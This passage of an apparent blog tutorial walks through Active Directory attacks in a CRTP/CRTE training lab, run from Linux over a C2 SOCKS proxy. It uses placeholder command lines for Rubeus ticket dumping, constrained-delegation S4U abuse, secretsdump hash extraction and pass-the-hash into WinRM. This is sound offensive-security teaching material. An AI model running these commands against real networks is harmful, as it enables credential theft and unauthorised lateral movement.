+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">proxychains bloodhound-python -u <span class="o">[</span>username<span class="o">]</span> -p <span class="o">[</span>password<span class="o">]</span> -d <span class="o">[</span>domain<span class="o">]</span>. -ns <span class="o">[</span>DC_IP<span class="o">]</span> -c all --dns-tcp
+</span></span></code></pre></div><p><img alt="17" src="https://i.gyazo.com/7f331e9f2c9e8c2bcc99ec61f961d9cc.png"></p>
+<p>When I first used <a href="https://github.com/dirkjanm/BloodHound.py">bloodhund-python</a>, I saw that the repository was:</p>
+<ul>
+<li>Updated recently (2 months ago)</li>
+<li>Almost 2000 stars</li>
+</ul>
+<p>And automatically assumed that it was stable and well-maintained. However, I quickly realized that the tool was not as stable as I thought it would be, and required a bit of debugging to get it to work.</p>
+<p>I want to emphasize that we shouldn&rsquo;t blame the tool&rsquo;s maintainers, as they&rsquo;re doing this work for free in their own time. I am extremely grateful for the work that they have done, and that this post is meant to show the reality (including the bad parts) of using tools from Linux.</p>
+<h3 id="alternative-collectors-rusthound">Alternative Collectors: RustHound</h3>
+<p>Another collector that I like to use if <code>bloodhound-python</code> is being a pain is <a href="https://github.com/NH-RED-TEAM/RustHound">RustHound</a>. It&rsquo;s a bit more stable, and is generally faster than other collectors.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">proxychains rusthound -u <span class="o">[</span>username<span class="o">]</span> -p <span class="o">[</span>password<span class="o">]</span> -d <span class="o">[</span>domain<span class="o">]</span>
+</span></span></code></pre></div><p><img alt="18" src="https://i.gyazo.com/4259644791bd8bc058ed733c5910a5d6.jpg"></p>
+<p>And it worked right out of the box, without any issues.</p>
+<h2 id="what-if-i-have-no-credentials">What if I have no credentials?</h2>
+<p>I wanted to take a quick detour to discuss your options if you have a foothold in a workstation on an unelevated user account, and you don&rsquo;t have credentials to this user. You could find yourself in this situation after compromising a web/SQL server and are sitting on a reverse shell.</p>
+<p>The first thing you should check is if your current logon session is populated with cached kerberos tickets, you can check this with <code>klist</code>, <code>Rubeus.exe triage</code> or <code>Rubeus.exe klist</code>. I prefer <code>Rubeus.exe triage</code> as service accounts tend to have lots of tickets and it&rsquo;s an eyesore to look at.</p>
+<p><img alt="19" src="https://i.gyazo.com/244f8fa9a2d746eb67228560ebc04038.png"></p>
+<p>This is what your output should look like if you&rsquo;re on an unelevated user account, as you won&rsquo;t be able to see other logon sessions.</p>
+<p>Now, we can dump our own tickets with <code>Rubeus.exe dump</code> and use them remotely.</p>
+<p><img alt="20" src="https://i.gyazo.com/68bbde24ec1a84c46700e4db6f105a06.png"></p>
+<p>Your output should look something like this (without the white boxes, of course)</p>
+<p><img alt="21" src="https://i.gyazo.com/01fa03dbfd2f7d8f1785765bbfaba4b4.png"></p>
+<p>Alternatively, you can use <code>Rubeus.exe tgtdeleg</code> to obtain a usable ticket for your current user without needing elevation.</p>
+<p><img alt="22" src="https://i.gyazo.com/19107436e2fb20f7fc95f5e523d6a198.png"></p>
+<h2 id="windows---linux-interoperability">Windows &lt;-&gt; Linux (Interoperability)</h2>
+<p>Tickets can be easily ported between Windows (<code>.kirbi</code>) and Linux (<code>.ccache</code>), allowing flexibility between operating systems. With reference to the tickets we acquired earlier with <code>tgtdeleg</code>, we can convert them to a format that is usable in Linux.</p>
+<p>The general steps are as follows:</p>
+<ol>
+<li>If the ticket is base64-encoded (from Rubeus), decode it with <code>echo [base64] | base64 -d &gt; ticket.kirbi</code></li>
+<li>Convert the ticket to a format that is usable in Linux with <code>ticketConverter.py ticket.kirbi ticket.ccache</code></li>
+<li>Export the <code>KRB5CCNAME</code> environment variable to point to the ticket with <code>export KRB5CCNAME=/path/to/ticket.ccache</code></li>
+<li>Run your (impacket) tools with <code>-k -no-pass</code> to indicate that you want to use the cache for authentication.</li>
+</ol>
+<p><img alt="23" src="https://i.gyazo.com/4c9cd783447f67460be18a81c3cf67f3.png"></p>
+<p>Next, we can use it with <code>netexec</code> by exporting the ticket and running it with <code>--use-kcache</code> (note that this flag changes between tools)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>... <span class="o">&amp;&amp;</span> nxc smb ... --use-kcache
+</span></span></code></pre></div><p><img alt="24" src="https://i.gyazo.com/7b2f344517d8ed8f6feefaff407e569d.png"></p>
+<p>The green plus sign indicates that we have successfully authenticated with the ticket.</p>
+<h2 id="performing-attacks">Performing Attacks</h2>
+<p>Now that we know how to port our tickets from Windows to Linux, we can start performing attacks remotely on the network.</p>
+<blockquote>
+<p>There will be little to no explanation of the specifics of the attacks performed, understanding the attack is an exercise left to the reader. Additionally, I recommend taking the <a href="https://www.alteredsecurity.com/adlab">CRTP</a> &amp; <a href="https://www.alteredsecurity.com/redteamlab">CRTE</a> courses from Altered Security.</p>
+</blockquote>
+<p>In this post, we&rsquo;ll only be covering one attack: abusing <strong>constrained delegation</strong> on a controlled principal.</p>
+<h3 id="constrained-delegation">Constrained Delegation</h3>
+<p>After reviewing our BloodHound collected data, we see this node</p>
+<p><img alt="25" src="https://i.gyazo.com/dad464e6636c3ea32d575e792750e814.png"></p>
+<p>Which indicates that <code>appsvc@us.techcorp.local</code> has the <code>msds-AllowedToDelegateTo</code> attribute set to <code>US-MSSQL.us.techcorp.local</code>, this means that <code>appsvc</code> is allowed to act on behalf of a domain user to a service on <code>US-MSSQL</code>.</p>
+<p>We can see the SPN that we can delegate to on the BloodHound node properties</p>
+<p><img alt="26" src="https://i.gyazo.com/e723accc4db57250a5a0187fbbdaba25.png"></p>
+<p>Or, we can enumerate it with <code>findDelegation.py</code> on Linux:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">proxychains findDelegation.py <span class="o">[</span>domain<span class="o">]</span>/<span class="o">[</span>username<span class="o">]</span>:<span class="o">[</span>password<span class="o">]</span>
+</span></span></code></pre></div><p><img alt="27" src="https://i.gyazo.com/e2e27ae966a46d2d5189eba9ec02cde3.png"></p>
+<p>We can see that <code>appsvc</code> is allowed to delegate to <code>CIFS/US-MSSQL.us.techcorp.local</code>, this is an extremely permissive delegation.</p>
+<blockquote>
+<p>See: <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#available-services">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#available-services</a></p>
+</blockquote>
+<p>For the sake of demonstration, let&rsquo;s assume that we have compromised the <code>appsvc</code> account and have their NTLM hash.</p>
+<h4 id="windows---linux">Windows -&gt; Linux</h4>
+<p>We&rsquo;ll perform the attack from Windows first, since it&rsquo;ll likely be more familiar to most readers.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">execute-assembly Rubeus.exe s4u /msdsspn:<span class="o">[</span>delegated_spn<span class="o">]</span> /domain:<span class="o">[</span>domain<span class="o">]</span> /user:<span class="o">[</span>user<span class="o">]</span> /rc4:<span class="o">[</span>ntlm hash<span class="o">]</span> /impersonateuser:<span class="o">[</span>user_with_local_admin<span class="o">]</span> /ptt
+</span></span></code></pre></div><blockquote>
+<p>Remember to check if your <code>/impersonateuser</code> has local admin privileges on the target machine, and is not protected from delegation. See: <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts">Protected Accounts</a> and <a href="https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group">Protected Users (Group)</a></p>
+</blockquote>
+<p><img alt="28" src="https://i.gyazo.com/62e89678fd3f3c826cc3527d99ca35bb.png"></p>
+<p>And the attack worked flawlessly, now let&rsquo;s see how we can pass this ticket to be used on Linux (i.e. <code>secretsdump.py</code> to dump hashes remotely).</p>
+<p>Firstly, we&rsquo;ll need the ticket to be in a format that is easily copy-pastable to Linux; we can do this with the <code>/nowrap</code> flag and of course remove the <code>/ptt</code> flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">execute-assembly Rubeus.exe s4u /msdsspn:<span class="o">[</span>delegated_spn<span class="o">]</span> /domain:<span class="o">[</span>domain<span class="o">]</span> /user:<span class="o">[</span>user<span class="o">]</span> /rc4:<span class="o">[</span>ntlm hash<span class="o">]</span> /impersonateuser:<span class="o">[</span>user_with_local_admin<span class="o">]</span> /nowrap
+</span></span></code></pre></div><p><img alt="29" src="https://i.gyazo.com/9bf98ef3a940f1dd4709f495f8945a35.png"></p>
+<p>Similarly to before, we can do the same trick to convert the ticket to a format that is usable in Linux.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[b64_ticket]&#34;</span> <span class="p">|</span> base64 -d &gt; ticket.kirbi <span class="o">&amp;&amp;</span> ticketConverter.py ticket.kirbi ticket.ccache <span class="o">&amp;&amp;</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>ticket.ccache
+</span></span></code></pre></div><p><img alt="30" src="https://i.gyazo.com/17d48ecaeaae86d2b5617f5f26a21a78.png"></p>
+<p>And, of course we can verify that the ticket is usable with <code>nxc</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nxc smb <span class="o">[</span>IP/FQDN<span class="o">]</span> --use-kcache
+</span></span></code></pre></div><p><img alt="31" src="https://i.gyazo.com/015982f7305b7f468e86444f27aa8194.png"></p>
+<p>We can also use <code>describeTicket.py</code> to visualize the contents of our ticket, and you&rsquo;ll see that we have a ticket that is usable for the <code>CIFS</code> service on <code>US-MSSQL</code>. However, this means that we won&rsquo;t be able to use WinRM.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">describeTicket.py ticket.ccache
+</span></span></code></pre></div><p><img alt="32" src="https://i.gyazo.com/21447cf5d00e245e6ebb7beacda4fb18.jpg"></p>
+<p>We can use the <code>altservice</code> flag to request a ticket for the <code>HTTP</code> service which is usable for WinRM.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">execute-assembly Rubeus.exe s4u /msdsspn:<span class="o">[</span>delegated_spn<span class="o">]</span> /domain:<span class="o">[</span>domain<span class="o">]</span> /user:<span class="o">[</span>user<span class="o">]</span> /rc4:<span class="o">[</span>ntlm hash<span class="o">]</span> /impersonateuser:<span class="o">[</span>user_with_local_admin<span class="o">]</span> /altservice:HTTP /nowrap
+</span></span></code></pre></div><p>And, now the ticket is usable for the <code>HTTP</code> service on <code>US-MSSQL</code>, which includes WinRM.</p>
+<p><img alt="33" src="https://i.gyazo.com/b4e8657cde2f695f6d3850ce30ed8b37.jpg"></p>
+<p>Alternatively, you can also use your <code>cifs</code> ticket to dump hashes on the target machine with <code>secretsdump.py</code>; and use the local administrator&rsquo;s hash to log on via WinRM.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">proxychains secretsdump.py -k -no-pass <span class="o">[</span>TARGET_FQDN<span class="o">]</span>
+</span></span></code></pre></div><p><img alt="34" src="https://i.gyazo.com/032952af57ea8025e1cf391ac4744ca6.png"></p>
+<p>Now, we can PTH this hash into WinRM with <code>evil-winrm</code> or <code>nxc winrm</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">proxychains nxc winrm <span class="o">[</span>IP/FQDN<span class="o">]</span> -u <span class="o">[</span>username<span class="o">]</span> -H <span class="o">[</span>hash<span class="o">]</span> --local-auth
+</span></span><span class="line"><span class="cl">proxychains evil-winrm -i <span class="o">[</span>IP/FQDN<span class="o">]</span> -u <span class="o">[</span>username<span class="o">]</span> -H <span class="o">[</span>hash<span class="o">]</span>
+</span></span></code></pre></div><p><img alt="35" src="https://i.gyazo.com/1b933204bd4bb01314c830ad52e6f4bf.png"></p>
+<h4 id="linux---windows">Linux -&gt; Windows</h4>
+<p>Similarly, we can perform this same attack but on the Linux side; then we&rsquo;ll transfer the ticket to Windows to verify that it works.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">getST.py -spn <span class="o">[</span>delegated_spn<span class="o">]</span> -impersonate <span class="o">[</span>user_with_local_admin<span class="o">]</span> <span class="o">[</span>controlled_principal<span class="o">]</span> -hashes :<span class="o">[</span>rc4<span class="o">]</span>
+</span></span></code></pre></div><p><img alt="36" src="https://i.gyazo.com/bcaa0f961ac903058c82c927d12e1220.png"></p>
+<p>We can verify that our ticket works with <code>nxc</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nxc smb <span class="o">[</span>IP/FQDN<span class="o">]</span> --use-kcache
+</span></span></code></pre></div><p><img alt="37" src="https://i.gyazo.com/01a9585cbbf87167c1f2d38b42864316.png"></p>
+<p>There are <strong>2</strong> options for transferring this ticket over to Windows:</p>
+<ol>
+<li>Transforming the <code>.ccache</code> to <code>.kirbi</code>, and referencing it in <code>Rubeus.exe ptt /ticket:[ticket.kirbi]</code>
+<ul>
+<li>Requires you to drop the ticket to disk, may be difficult if you don&rsquo;t have a C2</li>
+</ul>
+</li>
+<li>Transforming the <code>.ccache</code> to <code>.kirbi</code>, then Base64 encoding it and referencing it in <code>Rubeus.exe ptt /ticket:[base64_ticket]</code>
+<ul>
+<li>If you&rsquo;re using a C2, the length of the ticket may cause argument length issues depending on your C2 protocol</li>
+</ul>
+</li>
+</ol>
+<p>I&rsquo;ll be demonstrating the second method here, as it&rsquo;s a bit more messy and readers may not be familiar with it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ticketConverter.py ticket.ccache ticket.kirbi
+</span></span></code></pre></div><p><img alt="38" src="https://i.gyazo.com/6caa0ed0bae36d0ac7ef788d34d515c6.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cat ticket.kirbi <span class="p">|</span> base64 -w <span class="m">0</span>
+</span></span></code></pre></div><p><img alt="39" src="https://i.gyazo.com/db52db455c96c22273fe9a2a7882c899.png"></p>
+<p>Import the ticket on Windows with <code>Rubeus.exe ptt /ticket:[base64_ticket]</code></p>
+<p><img alt="40" src="https://i.gyazo.com/4793ff075f9fe172b2046b17e79bb3cb.png"></p>
+<p>We can see that our ticket was successfully imported with <code>Rubeus.exe klist</code></p>
+<p><img alt="41" src="https://i.gyazo.com/0a3f39e66fd22109e3c575aa450ebbb4.png"></p>
+<p>We can verify that our ticket works by listing shares on the target, although in hindsight <code>ADMIN$</code> would be a better share to check :P</p>
+<pre tabindex="0"><code>ls //[IP/FQDN]/c$
+</code></pre><p><img alt="42" src="https://i.gyazo.com/0af73f5bbfaa8ad3780c1cbaefc2e1c4.png"></p>
+<h2 id="why-you-shouldnt-perform-attacks-from-linux">Why you <strong>shouldn&rsquo;t</strong> perform attacks from Linux</h2>
+<p>As was briefly discussed in <a href="/posts/ad-linux/#the-curious-case-of-bloodhound-python">The Curious Case of Bloodhound-Python</a>, tools on Linux are not as stable as you would expect them to be. This is due to the fact that most tools are community-driven and are not as well-maintained as their Windows counterparts.</p>
+<p>Furthermore, this blog post heavily featured the use of an inband socks proxy as well as <code>proxychains</code> to proxy commands through the workstation. This may not be feasible in real world engagements, as the inband socks proxy essentially forces beacon to permanently run in <code>interactive</code> mode or <code>sleep 0</code> as any <code>sleep</code> duration may cause some protocols to break.</p>
+<h2 id="cheatsheet--faqs">Cheatsheet &amp; FAQs</h2>
+<p><strong>Q</strong>: Why are you censoring Kerberos tickets that will expire by the time this post is released?<br>
+<strong>A:</strong> In some cases, tickets can be cracked and I don&rsquo;t want to get in trouble. :P</p>
+<h3 id="proxychains">Proxychains</h3>
+<p>This wrapper simply proxies the rest of your command through a Socks5 proxy defined in <code>/etc/proxychains4.conf</code>. When you start Sliver&rsquo;s <code>socks5</code> proxy by default: it opens port 1081 on the <strong>operator&rsquo;s</strong> machine.</p>
+<p><img alt="43" src="https://i.gyazo.com/afee2d86d20464acc09a43755606d9c9.png"></p>
+<p>Remote connections will resemble the following -&gt; <code>getST.py -&gt; 127.0.0.1:1081 -&gt; WKSTN-1 (BEACON) -&gt; WKSTN-2</code></p>
+<p>This effectively allows you to access internal hosts via beacon, however as mentioned above; requires beacon to be running in <code>interactive</code> mode or <code>sleep 0</code>.</p>
+<h3 id="base64---kirbi---ccache">Base64 -&gt; .kirbi -&gt; .ccache</h3>
+<p>When you forge/request tickets with Rubeus, you generally get your tickets back in the <code>stdout</code> as <code>base64 ( kirbi )</code>. Alternatively, you can specify <code>/outfile</code> and the base64 wrapping wil be omitted.</p>
+<p>If you want to transfer this over to Linux, you&rsquo;ll have to either base64 encode it and copy paste it over to Linux; or download the <code>.kirbi</code> file over the wire.</p>
+<h4 id="windows---linux-1">Windows -&gt; Linux</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;doI...[snip]...&#34;</span> <span class="p">|</span> base64 -d  &gt; ticket.kirbi <span class="o">&amp;&amp;</span> ticketConverter.py ticket.kirbi ticket.ccache <span class="o">&amp;&amp;</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>ticket.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nxc smb <span class="o">[</span>...<span class="o">]</span> --use-kcache
+</span></span><span class="line"><span class="cl">impacket*.py -k -no-pass
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">unset</span> KRB5CCNAME
+</span></span></code></pre></div><h4 id="linux---windows-1">Linux -&gt; Windows</h4>
+<p>Some tools will save the resulting ticket as a usable <code>.ccache</code> file, others will do so with <code>.kirbi</code>; please exercise intuition. I&rsquo;d recommend using <code>describeTicket.py</code> to validate your <code>.ccache</code> before attempting to use it in Windows as you may get ungodly errors.</p>
+<p><code>base64</code> is ran with the <code>-w 0</code> flag to eliminate newlines when encoding the <code>.kirbi</code> file.</p>
+<p><img alt="44" src="https://i.gyazo.com/c689c21205779e1d9bcd27bb79afc41a.jpg"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">impacket*.py <span class="o">[</span>...<span class="o">]</span> 
+</span></span><span class="line"><span class="cl">ticketConverter.py ticket.ccache ticket.kirbi
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cat ticket.kirbi <span class="p">|</span> base64 -w <span class="m">0</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">execute-assembly -i Rubeus.exe ptt /ticket:doI...<span class="o">[</span>snip<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">execute-assembly -i Rubeus.exe ptt /ticket:ticket.kirbi
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">execute-assembly -i Rubeus.exe klist
+</span></span></code></pre></div><p><code>execute-assembly</code> is ran with the <code>-i</code> flag due to the character limit in beacon&rsquo;s <code>execute-assembly</code> fork and run.</p>
+<p><code>-i</code> tasks beacon to run the assembly inline, be careful when using this flag as it may cause beacon to crash if the assembly errors out.</p>
+<p>If you are unable to pass the base64 ticket to <code>Rubeus.exe ptt</code>, due to other constraints; you can simply drop <code>.kirbi</code> to disk and reference it with <code>Rubeus.exe ptt /ticket:[ticket.kirbi]</code>.</p>
+<h2 id="closing-thoughts">Closing Thoughts</h2>
+<p>I prefer to perform <strong>all</strong> attacks from Linux, as well as utilizing the tickets to perform lateral movement from Linux. These opinions are based strictly on a lab/examination perspective, where <strong>speed often takes priority over stealth</strong>.</p>
+<p>These opinions do not reflect my stance on real-world engagements where <strong>speed</strong> is a non-factor.</p>
+<p>In the context of solving labs and examinations quickly and easily, the following reasons are why I prefer to perform attacks from Linux:</p>
+<ol>
+<li>Kerberos Double Hop Problem
+<ul>
+<li>This no longer exists</li>
+</ul>
+</li>
+<li>PowerShell Constrained Language Mode (CLM)
+<ul>
+<li>This no longer exists, for the most part.</li>
+</ul>
+</li>
+<li>Anti-Virus Detection
+<ul>
+<li>You don&rsquo;t have to pray that your <code>execute-assembly</code> ticked off the AV gods anymore.</li>
+</ul>
+</li>
+<li>Debugging
+<ul>
+<li>You can actually modify the source code of your tools without recompiling them now!</li>
+</ul>
+</li>
+<li>Stability
+<ul>
+<li>Lab workstations are extremely unstable, and you don&rsquo;t want to be guessing whether the issue is with the lab, with your tools or with Windows.</li>
+</ul>
+</li>
+<li>Speed
+<ul>
+<li>All of the above points contribute to this; you can perform attacks much faster from Linux.</li>
+</ul>
+</li>
+</ol>
+<p>That being said, performing attacks from Linux is not <strong>theoretically faster</strong> than performing attacks from Windows; in fact it is quite the opposite. However, from my experience, the majority of the time spent on attacking Active Directory Environments is actually just debugging issues and not the actual attack itself.</p>
+<p>For what it&rsquo;s worth, I completed the CRTP and CRTE exams in 1 hour and 3 hours respectively; and I attribute this to the fact that I was able to debug issues much faster from Linux.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+</div>
+    <small class="footer_copyright">
+        © 2025 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
+</html>
